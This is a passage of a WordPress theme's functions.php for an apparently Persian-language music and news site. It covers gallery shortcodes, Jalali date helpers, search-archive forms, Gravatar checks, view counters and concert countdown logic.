        if (is_tax( 'videos' )) {
            $query->set('posts_per_page', '12');
        }
        if (is_tax( 'music-tag' )) {
            $query->set('posts_per_page', '16');
        }
        if (is_post_type_archive('tube')) {
            $query->set('posts_per_page', '9');
        }
    }
}
add_action( 'pre_get_posts', 'get_navagram_posts' );
/** End */

/** Get all galleries  */

function nava_show_gallery_image_urls( $content, $is_single = false ) {

    global $post;
    $post_id = $post->ID;

    if ($is_single == false) {
        // Only do this on singular items
        if( ! is_singular()  ) {
            return $content;
        }

        // Make sure the post has a gallery in it
        if( ! has_shortcode( $post->post_content, 'gallery' ) ) {
            return $content;
        }
    }

    $gallery = get_post_gallery( $post, false );
    $gallery_ids = $gallery['ids'];
    $gallery_ids = explode(',',$gallery_ids);

    // Retrieve the first gallery in the post

    $image_list = '<ul id="lightgallery" class="list-unstyled">';

    $args = array(
        'posts_per_page'   => -1,
        'include'          => $gallery_ids,
        'post_type'        => 'attachment',
    );
    $posts = get_posts($args);

    // Loop through each image in each gallery
    foreach( $posts as $p ) {
        $image_list .= '<li class="col-xs-6 col-sm-4 col-md-3 ';
        $image_list .= (!empty($is_single)) ? "nopadding" : "";
        $image_list .= '" data-src="';
        $image_list .= $p->guid;
        $image_list .= '"><a href="';
        $image_list .= get_the_permalink($post_id);
        $image_list .= '"><img class="img-responsive" src="';
        $image_list .= wp_get_attachment_image_src( $p->ID, 'nava_image_l' )[0];
        $image_list .= '"></a></li>';
    }

    $image_list .= '</ul>';

    // Append our image list to the content of our post
    $content = $image_list;
    return $content;

}
add_shortcode( 'navaGallery', 'nava_show_gallery_image_urls' );

/** End */

/** Get jalali month by number */
function jalali_name_by_number($number) {
    $month = '';
    switch($number) {
        case 1:
            $month = 'فروردین';
            break;
        case 2:
            $month = 'اردیبهشت';
            break;
        case 3:
            $month = 'خرداد';
            break;
        case 4:
            $month = 'تیر';
            break;
        case 5:
            $month = 'مرداد';
            break;
        case 6:
            $month = 'شهریور';
            break;
        case 7:
            $month = 'مهر';
            break;
        case 8:
            $month = 'آبان';
            break;
        case 9:
            $month = 'آذر';
            break;
        case 10:
            $month = 'دی';
            break;
        case 11:
            $month = 'بهمن';
            break;
        case 12:
            $month = 'اسفند';
            break;
        default:

    }
    return $month;
}
/** End */

/** Calculate age */
function calc_age($age) {
    $date = convert($age);
    $jdate = new MMTJDF();
    $now = date('Y');
    $date = $jdate->jalali_to_gregorian($date, 0, 0);
    $date = $date[0];
    return (int)$now - (int)$date;
}

function convert($string) {
    $persian = ['۰', '۱', '۲', '۳', '۴', '۵', '۶', '۷', '۸', '۹'];
    $arabic = ['٩', '٨', '٧', '٦', '٥', '٤', '٣', '٢', '١','٠'];


    $num = range(0, 9);
    $convertedPersianNums = str_replace($persian, $num, $string);
    $englishNumbersOnly = str_replace($arabic, $num, $convertedPersianNums);

    return $englishNumbersOnly;
}
/** End */

/**
 * Add support for the QuickTime (.mov) video format.
 */
add_filter( 'wp_video_extensions',
    function( $exts ) {
        $exts[] = 'mov';
        return $exts;
    }
);

add_filter('redirect_canonical','pif_disable_redirect_canonical');

function pif_disable_redirect_canonical($redirect_url) {
    if (is_search()) $redirect_url = false;
    return $redirect_url;
}

function nava_title_row($title, $link, $icon='', $more_text = 'آرشیو', $is_white = false, $htag = 'h2', $color = '') {

    $html = '<div class="row k-title-row clearfix">
        <div class="col-md-6">
            <'.$htag.' class="k-title-text">';
    $html .= '<i class="fa fa-caret-left"></i>';
    $html .= $title;
    $html .= '</'.$htag.'>
        </div>';
    if (!empty($more_text)) {
        $html .= '<div class="col-md-6">
            <a href="'.$link.'" class="more pull-left ';
        if ($is_white == false && empty($color)) {
            $html .= "black";
        } elseif ($is_white == false && empty($color)) {
            $html .= "white";
        } else {
            $html .= $color;
        }

        $html .= '">';
        $html .= $more_text;
        $html .= ' <i class="fa fa-chevron-circle-left" ></i>';
        $html .= '</a></div>';
    }
    $html .= '</div>';
    return $html;
}

function nava_search_title_row($title, $icon = '') {

    $html = '<div class="nopadding k-title-row clearfix">
        <div class="col-md-12">
            <h2 class="k-title-text"><i class="fa '. $icon .'"></i>'.$title.'</h2>
            <span class="k-title-line"></span>
        </div>
    </div>';
    return $html;
}

function nava_search_archive_left_btn($searchAction, $searchTerm = '', $type = 'post', $title = '', $icon = '', $is_white = false) {
    if ($type == 'post') {
        $searchTo = 'news';
    } else {
        $searchTo = ucfirst($type);
    }
    $searchAction .= "/";
    $searchTerm = strip_tags(esc_attr($searchTerm));
    $html = '<form method="POST" action="'.$searchAction.'">';
    $html .= '<input type="hidden" name="t" value="'.get_post_type_val(strip_tags(esc_attr($type)), 'number').'" />';
    $html .= "<input type='hidden' name='s".$searchTo."' value='on' checked />";
    if (!empty($searchTerm)) {
        $html .= '<input type="hidden" name="search" value="'.$searchTerm.'" />';
    }
    $html .= '<div class="row k-title-row clearfix">
            <div class="col-md-6">';
    $html .= '<h2 class="k-title-text">';
    $html .= (!empty($icon)) ? '<i class="fa '. $icon .'"></i>' : '';
    $html .= $title;
    $html .= '</h2></div><div class="col-md-6">';
    $html .= '<input type="submit" name="submit" class="kbtn ';
    $html .= ($is_white == false) ? "black" : "white";
    $html .= '" value="آرشیو">
            </div>
        </div></form>';
    return $html;
}

function nava_search_archive_btn($searchAction, $searchTerm = '', $type = 'post') {
    $type = get_post_type_val(strip_tags(esc_attr($type)), 'number');
    $searchTerm = strip_tags(esc_attr($searchTerm));
    $html = '<div class="col-md-12">
            <div class="me-search-archive-btn">
            <form method="POST" action="'.$searchAction.'">';
    $html .= '<input type="hidden" name="t" value="'.$type.'" />';
    switch($type) {
        case 1:
            $html .= '<input type="hidden" name="sNews" value="on" checked />';
            break;
        case 2:
            $html .= '<input type="hidden" name="sWiki" value="on" checked />';
            break;
        case 3:
            $html .= '<input type="hidden" name="sMusic" value="on" checked />';
            break;
        case 4:
            $html .= '<input type="hidden" name="sTv" value="on" checked />';
            break;
        case 5:
            $html .= '<input type="hidden" name="sNavagram" value="on" checked />';
            break;
        case 6:
            $html .= '<input type="hidden" name="sGallery" value="on" checked />';
            break;
        case 7:
            $html .= '<input type="hidden" name="sConcert" value="on"  checked />';
            break;
    }
    if (!empty($searchTerm)) {
        $html .= '<input type="hidden" name="search" value="'.$searchTerm.'" />';
    }
    $html .= '<input type="submit" name="submit" class="kbtn black" value="مشاهده بیشتر">
            </div>
            </form>
        </div>';
    return $html;
}


function get_post_type_val($postTypeValue, $returnType = 'string') {
    $postTypes = array(
        1 => 'post',
        2 => 'wiki',
        3 => 'music',
        4 => 'tv',
        5 => 'navagram',
        6 => 'gallery',
        7 => 'concert',
        8 => 'swiki'
    );

    foreach($postTypes as $key => $val) {
        if ($returnType == 'string') {
            if ($postTypeValue == $key) {
                return $val;
            }
        } elseif ($returnType == 'num' || $returnType == 'number') {
            if ($postTypeValue == $val) {
                return $key;
            }
        }
    }
}



function validate_gravatar($id_or_email) {
    //id or email code borrowed from wp-includes/pluggable.php
    $email = '';
    if ( is_numeric($id_or_email) ) {
        $id = (int) $id_or_email;
        $user = get_userdata($id);
        if ( $user )
            $email = $user->user_email;
    } elseif ( is_object($id_or_email) ) {
        // No avatar for pingbacks or trackbacks
        $allowed_comment_types = apply_filters( 'get_avatar_comment_types', array( 'comment' ) );
        if ( ! empty( $id_or_email->comment_type ) && ! in_array( $id_or_email->comment_type, (array) $allowed_comment_types ) )
            return false;

        if ( !empty($id_or_email->user_id) ) {
            $id = (int) $id_or_email->user_id;
            $user = get_userdata($id);
            if ( $user)
                $email = $user->user_email;
        } elseif ( !empty($id_or_email->comment_author_email) ) {
            $email = $id_or_email->comment_author_email;
        }
    } else {
        $email = $id_or_email;
    }

    $hashkey = md5(strtolower(trim($email)));
    $uri = 'http://www.gravatar.com/avatar/' . $hashkey . '?d=404';

    $data = wp_cache_get($hashkey);
    if (false === $data) {
        $response = wp_remote_head($uri);
        if( is_wp_error($response) ) {
            $data = 'not200';
        } else {
            $data = $response['response']['code'];
        }
        wp_cache_set($hashkey, $data, $group = '', $expire = 60*5);

    }
    if ($data == '200'){
        return true;
    } else {
        return false;
    }
}

/* adding comment textarea at the bottom of comment fields */
function nava_move_comment_field_to_bottom( $fields ) {
    $comment_field = $fields['comment'];
    unset( $fields['comment'] );
    $fields['comment'] = $comment_field;
    return $fields;
}

add_filter( 'comment_form_fields', 'nava_move_comment_field_to_bottom' );

/* add custom class to comment_replay_link */
add_filter('comment_reply_link', 'nava_reply_link_class');


function nava_reply_link_class($class){
    $class = str_replace("class='comment-reply-link", "class='c-comment-reply-btn btn btn-sm btn-default", $class);
    return $class;
}

function strip_shortcode_gallery( $content ) {
    preg_match_all( '/' . get_shortcode_regex() . '/s', $content, $matches, PREG_SET_ORDER );

    if ( ! empty( $matches ) ) {
        foreach ( $matches as $shortcode ) {
            if ( 'gallery' === $shortcode[2] ) {
                $pos = strpos( $content, $shortcode[0] );
                if( false !== $pos ) {
                    return substr_replace( $content, '', $pos, strlen( $shortcode[0] ) );
                }
            }
        }
    }

    return $content;
}




function mmt_views_columns_head($defaults) {
    $defaults['nava_views'] = 'بازدیدها';
    return $defaults;
}


function mmt_views_columns_content($column_name, $post_ID) {
    if ($column_name == 'nava_views') {
        $views = get_post_meta($post_ID, 'nava_post_views_count');

        if (isset($views) && !empty($views)) {
            echo $views[0];
        } else {
            echo '0';
        }
    }
}

add_filter('manage_posts_columns', 'mmt_views_columns_head');
add_action('manage_posts_custom_column', 'mmt_views_columns_content', 10, 2);

/* end click like column */
/* adding click likes to admin single post */

add_action( 'add_meta_boxes', 'add_nava_views_box' );

function add_nava_views_box() {
    add_meta_box( "nava_views_meta_box", "بازدیدها", 'nava_views_box', null, 'side', 'default' );
}

function nava_views_box() {

    global $post;

    $post_id = $post->ID;
    $views = get_post_meta($post_id,'nava_post_views_count')[0];
    if (empty($views)) {
        $views_count = "0";
    } else {
        $views_count = $views;
    }
    echo '<table class="form-table">';
    echo '	<tr>';
    echo '		<td style="font-size: 32px !important;font-weight: bold;text-align: center; width: 100%">'.$views_count.'</td>';
    echo '	</tr>';
    echo '</table>';

}
/*  end adding click likes to admin single post */

/** Get event */
function nava_check_event($startDate, $endDate, $startTime, $endTime) {


    $concert_start_date = explode('/',$startDate[0]);
    $jdate = new MMTJDF();

    if (!empty($startDate)) {
        $start_date = explode('/', esc_attr($startDate));
        $start_time = explode(':', esc_attr($startTime));
//        echo '<div class="hide">';
//        print_r($start_time);
//        echo $start_time[0]. ' ' . $start_time[1]. ' ' .'0'. ' ' . $start_date[1]. ' ' . $start_date[2] . ' ' . $start_date[0];
//        echo '</div>';
        $timestamp_start = $jdate->jmktime($start_time[0], $start_time[1], '0', $start_date[1], $start_date[2] , $start_date[0], '', 'GMT');

        $g_start_date = date("Y/m/d", $timestamp_start);

        $g_start_time = date("H:i:s", $timestamp_start);

        $start_date = array_merge(explode('/', $g_start_date), explode(":",$g_start_time));
        //$jalali_start_date = implode('/', $jdate->gregorian_to_jalali($start_date[0], $start_date[1], $start_date[2], "/"));
    }

    if (!empty($endDate)) {
        $end_date = explode('/', esc_attr($endDate));
        $end_time = explode(':', esc_attr($endTime));
        $timestamp_end = $jdate->jmktime($end_time[0], $end_time[1], '0', $end_date[1], $end_date[2] , $end_date[0], '', 'GMT');
        $g_end_date = date("Y/m/d", $timestamp_end);
        $g_end_time = date("H:i:s", $timestamp_end);

        $end_date = explode('/', $g_end_date);
        $end_date = array_merge($end_date, explode(":",$g_end_time));
        //$jalali_end_date = implode('/', $jdate->gregorian_to_jalali($end_date[0], $end_date[1], $end_date[2], "/"));
    }

    $now = date("Y/m/d H:i:s");
    $now = strtotime($now);

    $count_down_date = '';
    $count_down_time = '';
    $stat = -1;
    $ended_event = false;
    if ($timestamp_start > $now) {
        $stat = 0;
        //echo "<h3>زمان باقی مانده تا شروع کنسرت</h3>";
        $count_down_date_time = $start_date;
    } elseif ($now >= $timestamp_start && $now <= $timestamp_end) {
        $stat = 1;
        //echo "<h3>زمان باقی مانده تا پایان کنسرت</h3>";
        $count_down_date_time = $end_date;
    } elseif ($now > $timestamp_end) {
        $stat = 2;
        //echo "<h3 style='margin-bottom: 80px;'>این کنسرت به پایان رسیده است</h3>";
        $count_down_date_time = array('0000', '00', '00', '00', '00', '00');
        $ended_event = true;
    }

    $date = $jdate->jalali_to_gregorian($concert_start_date[0], $concert_start_date[1], $concert_start_date[2]);



    if ($ended_event == false) {
        wp_localize_script(
            'nava-script',
            'navaObject',
            array(
                'year'  => $count_down_date_time[0],
                'month' => $count_down_date_time[1],
                'day'   => $count_down_date_time[2],
                'hour'  => $count_down_date_time[3],
                'min'   => $count_down_date_time[4],
                'sec'   => $count_down_date_time[5]
            )
        );
    }
    return $stat;
}
/** End */

function filter_where_by_date($where = '') {
    $where .= " AND post_date > '" . date('Y-m-d H:i:s', strtotime('-5 days')) . "'";
    return $where;
}

function filter_1_days_ago($where = '') {
    $where .= " AND post_date > '" . date('Y-m-d H:i:s', strtotime('-3 days')) . "'";
    return $where;
}
function filter_7_days_ago($where = '') {
    $where .= " AND post_date > '" . date('Y-m-d H:i:s', strtotime('-7 days')) . "'";
    return $where;
}

function filter_30_days_ago($where = '') {
    $where .= " AND post_date > '" . date('Y-m-d H:i:s', strtotime('-30 days')) . "'";
    return $where;
}

if (!is_user_logged_in()) {
    add_action( 'wp_print_styles',     'nava_deregister_styles', 100 );
}
function nava_deregister_styles()    {
    //wp_deregister_style( 'amethyst-dashicons-style' );
    wp_deregister_style( 'dashicons' );
}


/** */

function nava_redirect_attachment_page($post_obj) {




    if ( is_attachment() ) {
        if ( $post && $post->post_parent ) {
            wp_redirect( esc_url( get_permalink( $post->post_parent ) ), 301 );
            exit;
        } else {
            wp_redirect( esc_url( home_url( '/' ) ), 301 );
            exit;
        }
    }
}
//add_action( 'the_post', 'nava_redirect_attachment_page' );

//if ( current_user_can('contributor') && !current_user_can('upload_files') )
//    add_action('admin_init', 'allow_contributor_uploads');
//function allow_contributor_uploads() {
//    $contributor = get_role('contributor');
//    $contributor->add_cap('upload_files');
//}
add_action( 'init', 'nava_deregister_heartbeat', 1 );
function nava_deregister_heartbeat() {
    global $pagenow;

    if ( 'post.php' != $pagenow && 'post-new.php' != $pagenow )
        wp_deregister_script('heartbeat');
}

function get_current_page_url() {
    $s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
    $protocol = strleft(strtolower($_SERVER["SERVER_PROTOCOL"]), "/").$s;
    $port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
    $url = $protocol."://".$_SERVER['SERVER_NAME'].$port.$_SERVER['REQUEST_URI'];
    return esc_url($url);
}

function strleft($s1, $s2) { return substr($s1, 0, strpos($s1, $s2)); }

//$h = new MMTHelper();
remove_action('wp_head', 'wp_generator');
require_once dirname( __FILE__ ) . '/cmb2/init.php';
require_once dirname( __FILE__ ) . '/functions/cmb2-options.php';

